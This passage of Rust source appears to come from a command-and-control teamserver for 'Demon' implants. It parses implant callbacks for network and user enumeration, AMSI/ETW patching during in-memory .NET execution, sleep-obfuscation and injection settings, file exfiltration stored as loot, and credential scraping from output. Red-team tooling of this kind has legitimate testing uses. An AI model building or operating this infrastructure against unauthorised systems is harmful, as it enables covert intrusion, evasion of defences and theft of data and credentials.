            )
        }
        DemonNetCommand::Sessions => {
            let target = parser.read_utf16("net sessions target")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                rows.push((
                    parser.read_utf16("net session client")?,
                    parser.read_utf16("net session user")?,
                    parser.read_u32("net session active")?,
                    parser.read_u32("net session idle")?,
                ));
            }
            (
                "Info",
                format!("Sessions for {target} [{}]: ", rows.len()),
                Some(format_net_sessions(&rows)),
            )
        }
        DemonNetCommand::Computer | DemonNetCommand::DcList => return Ok(None),
        DemonNetCommand::Share => {
            let target = parser.read_utf16("net shares target")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                rows.push((
                    parser.read_utf16("net share name")?,
                    parser.read_utf16("net share path")?,
                    parser.read_utf16("net share remark")?,
                    parser.read_u32("net share access")?,
                ));
            }
            (
                "Info",
                format!("Shares for {target} [{}]: ", rows.len()),
                Some(format_net_shares(&rows)),
            )
        }
        DemonNetCommand::LocalGroup => {
            let target = parser.read_utf16("net localgroup target")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                rows.push((
                    parser.read_utf16("net localgroup name")?,
                    parser.read_utf16("net localgroup description")?,
                ));
            }
            (
                "Info",
                format!("Local Groups for {target}: "),
                Some(format_net_group_descriptions(&rows)),
            )
        }
        DemonNetCommand::Group => {
            let target = parser.read_utf16("net group target")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                rows.push((
                    parser.read_utf16("net group name")?,
                    parser.read_utf16("net group description")?,
                ));
            }
            (
                "Info",
                format!("List groups on {target}: "),
                Some(format_net_group_descriptions(&rows)),
            )
        }
        DemonNetCommand::Users => {
            let target = parser.read_utf16("net users target")?;
            let mut users = Vec::new();
            while !parser.is_empty() {
                let username = parser.read_utf16("net user name")?;
                let is_admin = parser.read_bool("net user admin")?;
                users.push((username, is_admin));
            }
            let mut output = String::new();
            for (username, is_admin) in &users {
                output.push_str(&format!(
                    " - {username}{}\n",
                    if *is_admin { " (Admin)" } else { "" }
                ));
            }
            ("Info", format!("Users on {target}: "), Some(output.trim_end().to_owned()))
        }
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandNet),
        request_id,
        kind,
        &message,
        output,
    )?);
    Ok(None)
}

async fn handle_assembly_inline_execute_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser =
        CallbackParser::new(payload, u32::from(DemonCommand::CommandAssemblyInlineExecute));
    let info_id = parser.read_u32("assembly inline execute info id")?;

    let (kind, message) = match info_id {
        DOTNET_INFO_PATCHED => {
            ("Info", "[HwBpEngine] Amsi/Etw has been hooked & patched".to_owned())
        }
        DOTNET_INFO_NET_VERSION => {
            ("Info", format!("Using CLR Version: {}", parser.read_utf16("assembly clr version")?))
        }
        DOTNET_INFO_ENTRYPOINT_EXECUTED => (
            "Good",
            format!(
                "Assembly has been executed [Thread: {}]",
                parser.read_u32("assembly entrypoint thread id")?
            ),
        ),
        DOTNET_INFO_FINISHED => ("Good", "Finished executing assembly.".to_owned()),
        DOTNET_INFO_FAILED => {
            ("Error", "Failed to execute assembly or initialize the clr".to_owned())
        }
        _ => return Ok(None),
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandAssemblyInlineExecute),
        request_id,
        kind,
        &message,
        None,
    )?);
    Ok(None)
}

async fn handle_assembly_list_versions_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser =
        CallbackParser::new(payload, u32::from(DemonCommand::CommandAssemblyListVersions));
    let mut output = String::new();
    while !parser.is_empty() {
        output.push_str(&format!("   - {}\n", parser.read_utf16("assembly version")?));
    }

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandAssemblyListVersions),
        request_id,
        "Info",
        "List available assembly versions:",
        Some(output.trim_end().to_owned()),
    )?);
    Ok(None)
}

async fn handle_config_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandConfig));
    let key = parser.read_u32("config key")?;
    let key = DemonConfigKey::try_from(key).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandConfig),
            message: error.to_string(),
        }
    })?;

    let message = match key {
        DemonConfigKey::MemoryAlloc => {
            format!("Default memory allocation set to {}", parser.read_u32("config value")?)
        }
        DemonConfigKey::MemoryExecute => {
            format!("Default memory executing set to {}", parser.read_u32("config value")?)
        }
        DemonConfigKey::InjectSpawn64 => {
            format!("Default x64 target process set to {}", parser.read_utf16("config path")?)
        }
        DemonConfigKey::InjectSpawn32 => {
            format!("Default x86 target process set to {}", parser.read_utf16("config path")?)
        }
        DemonConfigKey::KillDate => {
            let raw = parser.read_u64("config kill date")?;
            let mut agent =
                registry.get(agent_id).await.ok_or(TeamserverError::AgentNotFound { agent_id })?;
            agent.kill_date = parse_optional_kill_date(
                raw,
                u32::from(DemonCommand::CommandConfig),
                "config kill date",
            )?;
            registry.update_agent(agent.clone()).await?;
            events.broadcast(agent_mark_event(&agent));
            if raw == 0 {
                "KillDate was disabled".to_owned()
            } else {
                "KillDate has been set".to_owned()
            }
        }
        DemonConfigKey::WorkingHours => {
            let raw = parser.read_u32("config working hours")?;
            let mut agent =
                registry.get(agent_id).await.ok_or(TeamserverError::AgentNotFound { agent_id })?;
            agent.working_hours = decode_working_hours(raw);
            registry.update_agent(agent.clone()).await?;
            events.broadcast(agent_mark_event(&agent));
            if raw == 0 {
                "WorkingHours was disabled".to_owned()
            } else {
                "WorkingHours has been set".to_owned()
            }
        }
        DemonConfigKey::ImplantSpfThreadStart => {
            let module = parser.read_string("config spf module")?;
            let symbol = parser.read_string("config spf symbol")?;
            format!("Sleep obfuscation spoof thread start addr to {module}!{symbol}")
        }
        DemonConfigKey::ImplantSleepTechnique => {
            format!("Sleep obfuscation technique set to {}", parser.read_u32("config value")?)
        }
        DemonConfigKey::ImplantCoffeeVeh => {
            format!("Coffee VEH set to {}", bool_string(parser.read_bool("config coffee veh")?))
        }
        DemonConfigKey::ImplantCoffeeThreaded => format!(
            "Coffee threading set to {}",
            bool_string(parser.read_bool("config coffee threaded")?)
        ),
        DemonConfigKey::InjectTechnique => {
            format!("Set default injection technique to {}", parser.read_u32("config value")?)
        }
        DemonConfigKey::InjectSpoofAddr => {
            let module = parser.read_string("config inject spoof module")?;
            let symbol = parser.read_string("config inject spoof symbol")?;
            format!("Injection thread spoofing value set to {module}!{symbol}")
        }
        DemonConfigKey::ImplantVerbose => format!(
            "Implant verbose messaging: {}",
            bool_string(parser.read_bool("config implant verbose")?)
        ),
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandConfig),
        request_id,
        "Good",
        &message,
        None,
    )?);
    Ok(None)
}

async fn handle_transfer_callback(
    events: &EventBus,
    downloads: &DownloadTracker,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandTransfer));
    let subcommand = parser.read_u32("transfer subcommand")?;
    let subcommand = DemonTransferCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandTransfer),
            message: error.to_string(),
        }
    })?;

    match subcommand {
        DemonTransferCommand::List => {
            let active = downloads.active_for_agent(agent_id).await;
            let mut output = String::from(
                " File ID   Size      Progress  State     File\n -------   ----      --------  -----     ----\n",
            );
            let mut count = 0_usize;

            while !parser.is_empty() {
                let file_id = parser.read_u32("transfer list file id")?;
                let progress = u64::from(parser.read_u32("transfer list progress")?);
                let state = parser.read_u32("transfer list state")?;
                if let Some((_, download)) =
                    active.iter().find(|(active_file_id, _)| *active_file_id == file_id)
                {
                    output.push_str(&format!(
                        " {file_id:<7x}   {:<8}  {:<8}  {:<8}  {}\n",
                        byte_count(download.expected_size),
                        transfer_progress_text(progress, download.expected_size),
                        transfer_state_name(state),
                        download.remote_path
                    ));
                    count += 1;
                }
            }

            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandTransfer),
                request_id,
                "Info",
                &format!("List downloads [{count} current downloads]:"),
                Some(output.trim_end().to_owned()),
            )?);
        }
        DemonTransferCommand::Stop
        | DemonTransferCommand::Resume
        | DemonTransferCommand::Remove => {
            let found = parser.read_bool("transfer found")?;
            let file_id = parser.read_u32("transfer file id")?;
            let exists = downloads
                .active_for_agent(agent_id)
                .await
                .iter()
                .any(|(active_file_id, _)| *active_file_id == file_id);
            let (kind, message) = match subcommand {
                DemonTransferCommand::Stop => {
                    if found && exists {
                        ("Good", format!("Successfully found and stopped download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!("Couldn't stop download {file_id:x}: Download does not exist"),
                        )
                    } else {
                        ("Error", format!("Couldn't stop download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::Resume => {
                    if found && exists {
                        ("Good", format!("Successfully found and resumed download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!(
                                "Couldn't resume download {file_id:x}: Download does not exist"
                            ),
                        )
                    } else {
                        ("Error", format!("Couldn't resume download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::Remove => {
                    if found && exists {
                        let _ = downloads.finish(agent_id, file_id).await;
                        ("Good", format!("Successfully found and removed download: {file_id:x}"))
                    } else if found {
                        (
                            "Error",
                            format!(
                                "Couldn't remove download {file_id:x}: Download does not exist"
                            ),
                        )
                    } else {
                        ("Error", format!("Couldn't remove download {file_id:x}: FileID not found"))
                    }
                }
                DemonTransferCommand::List => unreachable!(),
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandTransfer),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
    }

    Ok(None)
}

async fn handle_mem_file_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandMemFile));
    let mem_file_id = parser.read_u32("mem file id")?;
    let success = parser.read_bool("mem file success")?;
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandMemFile),
        request_id,
        if success { "Good" } else { "Error" },
        &format!(
            "Memory file {:x} {}",
            mem_file_id,
            if success { "registered successfully" } else { "failed to register" }
        ),
        None,
    )?);
    Ok(None)
}

async fn handle_package_dropped_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandPackageDropped));
    let package_length = parser.read_u32("dropped package length")?;
    let max_length = parser.read_u32("dropped package max length")?;
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandPackageDropped),
        request_id,
        "Error",
        &format!(
            "A package was discarded by demon for being larger than PIPE_BUFFER_MAX ({package_length} > {max_length})"
        ),
        None,
    )?);
    Ok(None)
}

async fn handle_beacon_output_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
    let callback = parser.read_u32("beacon callback type")?;
    let context = loot_context(registry, agent_id, request_id).await;

    match DemonCallback::try_from(callback).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::BeaconOutput),
            message: error.to_string(),
        }
    })? {
        DemonCallback::Output => {
            let output = parser.read_string("beacon output text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
            let output = parser.read_utf16("beacon output utf16")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Good".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::ErrorMessage => {
            let output = parser.read_string("beacon error text")?;
            if !output.is_empty() {
                broadcast_and_persist_agent_response(
                    database,
                    events,
                    AgentResponseEntry {
                        agent_id,
                        command_id: u32::from(DemonCommand::BeaconOutput),
                        request_id,
                        kind: "Error".to_owned(),
                        message: format!("Received Output [{} bytes]:", output.len()),
                        extra: BTreeMap::new(),
                        output: output.clone(),
                    },
                    &context,
                )
                .await?;
                persist_credentials_from_output(
                    database,
                    events,
                    plugins,
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    &output,
                    &context,
                )
                .await?;
            }
        }
        DemonCallback::File => {
            let bytes = parser.read_bytes("beacon file open")?;
            let (file_id, expected_size, remote_path) =
                parse_file_open_header(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
            downloads
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id,
                        remote_path: remote_path.clone(),
                        expected_size,
                        data: Vec::new(),
                        started_at,
                    },
                )
                .await;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                request_id,
                file_id,
                &remote_path,
                0,
                expected_size,
                "Started",
            )?);
        }
        DemonCallback::FileWrite => {
            let bytes = parser.read_bytes("beacon file write")?;
            let (file_id, chunk) = parse_file_chunk(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let state = downloads.append(agent_id, file_id, &chunk).await?;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                state.request_id,
                file_id,
                &state.remote_path,
                u64::try_from(state.data.len()).unwrap_or_default(),
                state.expected_size,
                "InProgress",
            )?);
        }
        DemonCallback::FileClose => {
            let bytes = parser.read_bytes("beacon file close")?;
            let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            if let Some(state) = downloads.finish(agent_id, file_id).await {
                let record =
                    persist_download(database, agent_id, file_id, &state, &context).await?;
                events.broadcast(loot_new_event(
                    &record,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    &context,
                )?);
                events.broadcast(download_complete_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    file_id,
                    &state,
                )?);
                if let Some(plugins) = plugins
                    && let Err(error) = plugins.emit_loot_captured(&record).await
                {
                    warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
                }
            }
        }
    }

    Ok(None)
}

async fn handle_filesystem_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandFs));
    let subcommand = parser.read_u32("filesystem subcommand")?;
    let context = loot_context(registry, agent_id, request_id).await;
    let subcommand = DemonFilesystemCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandFs),
            message: error.to_string(),
        }
    })?;
    match subcommand {
        DemonFilesystemCommand::Dir => {
            let explorer = parser.read_bool("filesystem dir explorer")?;
            let list_only = parser.read_bool("filesystem dir list only")?;
            let root_path = parser.read_utf16("filesystem dir root path")?;
            let success = parser.read_bool("filesystem dir success")?;
            let mut lines = Vec::new();
            let mut explorer_rows = Vec::new();

            if success {
                while !parser.is_empty() {
                    let path = parser.read_utf16("filesystem dir path")?;
                    let file_count = parser.read_u32("filesystem dir file count")?;
                    let dir_count = parser.read_u32("filesystem dir dir count")?;
                    let total_size = if list_only {
                        None
                    } else {
                        Some(parser.read_u64("filesystem dir total size")?)
                    };

                    if !explorer {
                        lines.push(format!(" Directory of {path}"));
                        lines.push(String::new());
                    }

                    let item_count = file_count + dir_count;
                    for _ in 0..item_count {
                        let name = parser.read_utf16("filesystem dir item name")?;
                        if list_only {
                            lines.push(format!("{}{}", path.trim_end_matches('*'), name));
                            continue;
                        }
                        let is_dir = parser.read_bool("filesystem dir item is dir")?;
                        let size = parser.read_u64("filesystem dir item size")?;
                        let day = parser.read_u32("filesystem dir item day")?;
                        let month = parser.read_u32("filesystem dir item month")?;
                        let year = parser.read_u32("filesystem dir item year")?;
                        let minute = parser.read_u32("filesystem dir item minute")?;
                        let hour = parser.read_u32("filesystem dir item hour")?;
                        let modified = format!("{day:02}/{month:02}/{year}  {hour:02}:{minute:02}");
                        if explorer {
                            explorer_rows.push(Value::Object(
                                [
                                    (
                                        "Type".to_owned(),
                                        Value::String(if is_dir { "dir" } else { "" }.to_owned()),
                                    ),
                                    (
                                        "Size".to_owned(),
                                        Value::String(if is_dir {
                                            String::new()
                                        } else {
                                            byte_count(size)
                                        }),
                                    ),
                                    ("Modified".to_owned(), Value::String(modified)),
                                    ("Name".to_owned(), Value::String(name)),
                                ]
                                .into_iter()
                                .collect(),
                            ));
                        } else {
                            let dir_text = if is_dir { "<DIR>" } else { "" };
                            let size_text = if is_dir { String::new() } else { byte_count(size) };
                            lines.push(format!(
                                "{modified:<17}    {dir_text:<5}  {size_text:<12}   {name}"
                            ));
                        }
                    }

                    if !explorer && !list_only && (file_count > 0 || dir_count > 0) {
                        lines.push(format!(
                            "               {file_count} File(s)     {}",
                            byte_count(total_size.unwrap_or_default())
                        ));
                        lines.push(format!("               {dir_count} Folder(s)"));
                        lines.push(String::new());
                    }
                }
            }

            let output = if lines.is_empty() {
                "No file or folder was found".to_owned()
            } else {
                lines.join("\n").trim().to_owned()
            };
            let mut extra = BTreeMap::new();
            if explorer {
                extra.insert("MiscType".to_owned(), Value::String("FileExplorer".to_owned()));
                extra.insert(
                    "MiscData".to_owned(),
                    Value::String(
                        BASE64_STANDARD.encode(
                            serde_json::to_vec(&Value::Object(
                                [
                                    ("Path".to_owned(), Value::String(root_path)),
                                    ("Files".to_owned(), Value::Array(explorer_rows)),
                                ]
                                .into_iter()
                                .collect(),
                            ))
                            .map_err(|error| {
                                CommandDispatchError::InvalidCallbackPayload {
                                    command_id: u32::from(DemonCommand::CommandFs),
                                    message: error.to_string(),
                                }
                            })?,
                        ),
                    ),
                );
            }
            events.broadcast(agent_response_event_with_extra(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                if output == "No file or folder was found" {
                    "No file or folder was found"
                } else {
                    "Directory listing completed"
                },
                extra,
                output,
            )?);
        }
        DemonFilesystemCommand::Download => {
            let mode = parser.read_u32("filesystem download mode")?;
            let file_id = parser.read_u32("filesystem download file id")?;
            match mode {
                0 => {
                    let expected_size = parser.read_u64("filesystem download size")?;
                    let remote_path = parser.read_utf16("filesystem download path")?;
                    let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
                    downloads
                        .start(
                            agent_id,
                            file_id,
                            DownloadState {
                                request_id,
                                remote_path: remote_path.clone(),
                                expected_size,
                                data: Vec::new(),
                                started_at,
                            },
                        )
                        .await;
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::CommandFs),
                        request_id,
                        file_id,
                        &remote_path,
                        0,
                        expected_size,
                        "Started",
                    )?);
                }
                1 => {
                    let chunk = parser.read_bytes("filesystem download chunk")?;
                    let state = downloads.append(agent_id, file_id, &chunk).await?;
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::CommandFs),
                        state.request_id,
                        file_id,
                        &state.remote_path,
                        u64::try_from(state.data.len()).unwrap_or_default(),
                        state.expected_size,
                        "InProgress",
                    )?);
                }
                2 => {
                    let reason = parser.read_u32("filesystem download close reason")?;
                    if let Some(state) = downloads.finish(agent_id, file_id).await {
                        if reason == 0 {
                            let record =
                                persist_download(database, agent_id, file_id, &state, &context)
                                    .await?;
                            events.broadcast(loot_new_event(
                                &record,
                                u32::from(DemonCommand::CommandFs),
                                state.request_id,
                                &context,
                            )?);
                            events.broadcast(download_complete_event(
                                agent_id,
                                u32::from(DemonCommand::CommandFs),
                                state.request_id,
                                file_id,
                                &state,
                            )?);
                            if let Some(plugins) = plugins
                                && let Err(error) = plugins.emit_loot_captured(&record).await
                            {
                                warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
                            }
                        } else {
                            events.broadcast(download_progress_event(
                                agent_id,
                                u32::from(DemonCommand::CommandFs),
                                state.request_id,
                                file_id,
                                &state.remote_path,
                                u64::try_from(state.data.len()).unwrap_or_default(),
                                state.expected_size,
                                "Removed",
                            )?);
                        }
                    }
                }
                other => {
                    return Err(CommandDispatchError::InvalidCallbackPayload {
                        command_id: u32::from(DemonCommand::CommandFs),
                        message: format!("unsupported filesystem download mode {other}"),
                    });
                }
            }
        }
        DemonFilesystemCommand::Upload => {
            let size = parser.read_u32("filesystem upload size")?;
            let path = parser.read_utf16("filesystem upload path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Uploaded file: {path} ({size} bytes)"),
                None,
            )?);
        }
        DemonFilesystemCommand::Cd => {
            let path = parser.read_utf16("filesystem cd path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Changed directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Remove => {
            let is_dir = parser.read_bool("filesystem remove is dir")?;
            let path = parser.read_utf16("filesystem remove path")?;
            let noun = if is_dir { "directory" } else { "file" };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Removed {noun}: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Mkdir => {
            let path = parser.read_utf16("filesystem mkdir path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Created directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
            let success = parser.read_bool("filesystem copy/move success")?;
            let from = parser.read_utf16("filesystem copy/move from")?;
            let to = parser.read_utf16("filesystem copy/move to")?;
            let verb =
                if matches!(subcommand, DemonFilesystemCommand::Copy) { "copied" } else { "moved" };
            let kind = if success { "Good" } else { "Error" };
            let message = if success {
                format!("Successfully {verb} file {from} to {to}")
            } else {
                format!("Failed to {verb} file {from} to {to}")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        DemonFilesystemCommand::GetPwd => {
            let path = parser.read_utf16("filesystem pwd path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Current directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Cat => {
            let path = parser.read_utf16("filesystem cat path")?;
            let success = parser.read_bool("filesystem cat success")?;
            let output = parser.read_string("filesystem cat output")?;
            let (kind, message) = if success {
                ("Info", format!("File content of {path} ({}):", output.len()))
            } else {
                ("Error", format!("Failed to read file: {path}"))
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                kind,
                &message,
                if success { Some(output) } else { None },
            )?);
        }
    }

    Ok(None)
}

fn parse_file_open_header(
    command_id: u32,
    bytes: &[u8],
) -> Result<(u32, u64, String), CommandDispatchError> {
    if bytes.len() < 8 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file open payload: expected at least 8 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file id parse failure".to_owned(),
        }
    })?);
    let expected_size = u64::from(u32::from_be_bytes(bytes[4..8].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file size parse failure".to_owned(),
        }
    })?));
    let path = String::from_utf8_lossy(&bytes[8..]).trim_end_matches('\0').to_owned();
    Ok((file_id, expected_size, path))
}

fn parse_file_chunk(command_id: u32, bytes: &[u8]) -> Result<(u32, Vec<u8>), CommandDispatchError> {
    if bytes.len() < 4 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file chunk payload: expected at least 4 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file id parse failure".to_owned(),
        }
    })?);
    Ok((file_id, bytes[4..].to_vec()))
}

fn parse_file_close(command_id: u32, bytes: &[u8]) -> Result<u32, CommandDispatchError> {
    if bytes.len() < 4 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file close payload: expected 4 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file close parse failure".to_owned(),
        }
    })?);
    Ok(file_id)
}

async fn persist_download(
    database: &Database,
    agent_id: u32,
    file_id: u32,
    state: &DownloadState,
    context: &LootContext,
) -> Result<LootRecord, CommandDispatchError> {
    let name = state
        .remote_path
        .replace('\\', "/")
        .rsplit('/')
        .next()
        .unwrap_or(state.remote_path.as_str())
        .trim_end_matches('\0')
        .to_owned();
    insert_loot_record(
        database,
        LootRecord {
            id: None,
            agent_id,
            kind: "download".to_owned(),
            name,
            file_path: Some(state.remote_path.clone()),
            size_bytes: Some(i64::try_from(state.data.len()).unwrap_or_default()),
            captured_at: OffsetDateTime::now_utc().format(&Rfc3339)?,
            data: Some(state.data.clone()),
            metadata: Some(metadata_with_context(
                [
                    ("file_id".to_owned(), Value::String(format!("{file_id:08X}"))),
                    ("request_id".to_owned(), Value::String(format!("{:X}", state.request_id))),
                    ("expected_size".to_owned(), Value::String(state.expected_size.to_string())),
                    ("started_at".to_owned(), Value::String(state.started_at.clone())),
                ]
                .into_iter(),
                context,
            )),
        },
    )
    .await
}

fn download_progress_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    file_id: u32,
    remote_path: &str,
    current_size: u64,
    expected_size: u64,
    state: &str,
) -> Result<OperatorMessage, CommandDispatchError> {
    let message = format!(
        "{state} download of file: {remote_path} [{}/{}]",
        byte_count(current_size),
        byte_count(expected_size)
    );
    agent_response_event_with_extra(
        agent_id,
        command_id,
        request_id,
        "Info",
        &message,
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("download-progress".to_owned())),
            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
            ("FileName".to_owned(), Value::String(remote_path.to_owned())),
            ("CurrentSize".to_owned(), Value::String(current_size.to_string())),
            ("ExpectedSize".to_owned(), Value::String(expected_size.to_string())),
            ("State".to_owned(), Value::String(state.to_owned())),
        ]),
        String::new(),
    )
}

fn download_complete_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    file_id: u32,
    state: &DownloadState,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra(
        agent_id,
        command_id,
        request_id,
        "Good",
        &format!("Finished download of file: {}", state.remote_path),
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("download".to_owned())),
            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
            ("FileName".to_owned(), Value::String(state.remote_path.clone())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&state.data))),
            (
                "MiscData2".to_owned(),
                Value::String(format!(
                    "{};{}",
                    BASE64_STANDARD.encode(state.remote_path.as_bytes()),
                    byte_count(u64::try_from(state.data.len()).unwrap_or_default())
                )),
            ),
        ]),
        String::new(),
    )
}

fn byte_count(size: u64) -> String {
    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
    let mut value = size as f64;
    let mut unit = 0usize;
    while value >= 1000.0 && unit < UNITS.len() - 1 {
        value /= 1000.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{size} {}", UNITS[unit])
    } else {
        format!("{value:.2} {}", UNITS[unit])
    }
}

async fn handle_process_list_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandProcList));
    let _from_process_manager = parser.read_u32("process ui flag")?;
    let mut rows = Vec::new();

    while !parser.is_empty() {
        let name = parser.read_utf16("process name")?;
        let pid = parser.read_u32("process pid")?;
        let is_wow = parser.read_u32("process wow64")?;
